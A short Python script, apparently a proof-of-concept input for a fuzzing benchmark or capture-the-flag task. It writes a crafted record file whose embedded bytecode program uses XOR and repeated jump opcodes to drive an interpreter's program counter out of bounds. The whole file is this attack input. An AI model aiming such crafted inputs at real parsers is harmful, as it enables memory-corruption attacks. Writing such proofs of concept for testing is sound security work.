import struct
import sys


data = b"A" * 32  # Merchant ID
data += b"B" * 32  # Customer ID
data += struct.pack("<I", 1)  # One record

# Record type: Animated Message
data += struct.pack("<I", 8 + 32 + 256)  # Record size
data += struct.pack("<I", 3)  # Record type
data += b"X" * 31 + b'\x00'  # 32-byte message

# Malicious program to manipulate `zf` and `pc`
data += b'\x05\x00\x00'  # XOR `regs[0] ^= regs[0]`, setting `zf = 1`
data += b'\x10\x7F\x00'  # If `zf` is set, move `pc` forward by 127 
data += b'\x10\x7F\x00'  # move `pc` forward by another 127
data += b'\x10\x7F\x00'  # move `pc` forward by another 127 (definitely out of bounds)
data += b'\x08' * (256 - 12)  # Fill remaining space with NOP-like instructions

# Write the file
f = open(sys.argv[1], 'wb')
datalen = len(data) + 4  # Plus 4 bytes for the length itself
f.write(struct.pack("<I", datalen))
f.write(data)
f.close()


